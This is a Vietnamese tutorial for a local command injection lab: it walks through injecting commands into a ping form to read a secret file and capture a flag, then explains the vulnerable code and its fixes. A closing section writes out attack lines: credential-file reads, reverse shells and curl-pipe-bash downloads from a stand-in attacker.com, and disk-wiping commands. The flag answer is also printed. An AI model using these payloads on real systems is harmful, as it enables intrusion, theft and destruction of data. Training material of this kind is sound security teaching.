# 🌐 Command Injection Lab - Hướng Dẫn

## 🎯 Mục tiêu

Tìm hiểu và khai thác lỗ hổng Command Injection để đọc file bí mật `secret.txt` và lấy FLAG.

## 🚀 Truy cập Lab

```
http://localhost:3000/lab/cmdi
```

## 📝 Các bước thực hành

### Bước 1: Test chức năng bình thường

Nhập địa chỉ IP hoặc domain hợp lệ:

```
8.8.8.8
```

hoặc

```
google.com
```

**Kết quả:** Hiển thị kết quả ping bình thường

### Bước 2: Phát hiện lỗ hổng

Thử command chaining với dấu `;`:

```
8.8.8.8; whoami
```

**Kết quả:** Nếu hiển thị username → Có lỗ hổng Command Injection!

### Bước 3: Liệt kê file trong thư mục

```
8.8.8.8; ls -la
```

**Kết quả:** Hiển thị danh sách file trong thư mục hiện tại

### Bước 4: Tìm file secret

```
8.8.8.8; ls | grep secret
```

**Kết quả:** Tìm thấy `secret.txt`

### Bước 5: Đọc file và lấy FLAG 🚩

```
8.8.8.8; cat secret.txt
```

**Kết quả:** `FLAG{C0mm4nd_1nj3ct10n_M4st3r_2024}`

## 🧪 Các payload khác

### Sử dụng && (AND operator)

```
8.8.8.8 && pwd
8.8.8.8 && id
```

### Sử dụng || (OR operator)

```
invalid_ip || whoami
```

### Sử dụng | (Pipe)

```
8.8.8.8; ls | wc -l
```

### Sử dụng command substitution

```
8.8.8.8; echo "User: $(whoami)"
8.8.8.8; echo `date`
```

### Đọc file hệ thống (Linux)

```
8.8.8.8; cat /etc/passwd
8.8.8.8; cat /etc/hostname
```

### Liệt kê biến môi trường

```
8.8.8.8; env
8.8.8.8; printenv
```

## 🔍 Giải thích kỹ thuật

### Tại sao có lỗ hổng?

**Code trong server.js:**

```javascript
const cmd = `ping -c 4 ${ip}`;
exec(cmd, callback);
```

❌ **Vấn đề:**

-   Nối chuỗi trực tiếp user input vào command
-   Sử dụng `exec()` với `shell=true` (mặc định)
-   Không validate hoặc sanitize input

### Cách khai thác:

**Input:** `8.8.8.8; cat secret.txt`

**Command thực tế:**

```bash
ping -c 4 8.8.8.8; cat secret.txt
```

**Giải thích:**

-   `ping -c 4 8.8.8.8` → Thực thi bình thường
-   `;` → Kết thúc lệnh đầu, bắt đầu lệnh mới
-   `cat secret.txt` → Đọc file bí mật

## 🛡️ Cách phòng chống

### ❌ KHÔNG AN TOÀN:

```javascript
const cmd = `ping ${ip}`;
exec(cmd, callback);
```

### ✅ AN TOÀN hơn - Sử dụng execFile():

```javascript
const { execFile } = require("child_process");

execFile("ping", ["-c", "4", ip], (error, stdout) => {
    // execFile không chạy qua shell
    // Mỗi argument được truyền riêng biệt
});
```

### ✅ TỐT NHẤT - Validate input:

```javascript
// Chỉ cho phép IP address hợp lệ
const ipRegex = /^(\d{1,3}\.){3}\d{1,3}$/;

if (!ipRegex.test(ip)) {
    return res.json({ error: "Invalid IP address" });
}

// Hoặc whitelist domain
const allowedDomains = ["google.com", "cloudflare.com"];
if (!allowedDomains.includes(ip)) {
    return res.json({ error: "Domain not allowed" });
}
```

### ✅ SỬ DỤNG THƯ VIỆN:

```javascript
// Sử dụng thư viện ping chuyên dụng thay vì gọi system command
const ping = require("ping");

ping.promise.probe(ip).then((result) => {
    // Xử lý kết quả
});
```

## 🎓 Bài tập nâng cao

1. **Đọc nhiều file cùng lúc:**

    ```
    8.8.8.8; cat secret.txt package.json
    ```

2. **Tìm file chứa từ khóa:**

    ```
    8.8.8.8; grep -r "FLAG" .
    ```

3. **Thực thi nhiều lệnh:**

    ```
    8.8.8.8; whoami && pwd && ls
    ```

4. **Bypass với URL encoding (nếu có filter):**
    ```
    8.8.8.8%3B%20cat%20secret.txt
    ```

## ⚠️ Nguy hiểm trong thực tế

Nếu có lỗ hổng Command Injection, attacker có thể:

### 1. Đọc file nhạy cảm

```bash
; cat /etc/shadow
; cat ~/.ssh/id_rsa
; cat .env
```

### 2. Reverse Shell

```bash
; bash -i >& /dev/tcp/attacker.com/4444 0>&1
; nc -e /bin/bash attacker.com 4444
```

### 3. Chiếm quyền server

```bash
; curl http://attacker.com/backdoor.sh | bash
; wget http://attacker.com/malware -O /tmp/m && chmod +x /tmp/m && /tmp/m
```

### 4. Phá hoại hệ thống

```bash
; rm -rf /
; dd if=/dev/zero of=/dev/sda
```

## 🔑 FLAG

```
FLAG{C0mm4nd_1nj3ct10n_M4st3r_2024}
```

---

⚠️ **Chỉ sử dụng trong môi trường lab - KHÔNG thử trên hệ thống thực!**
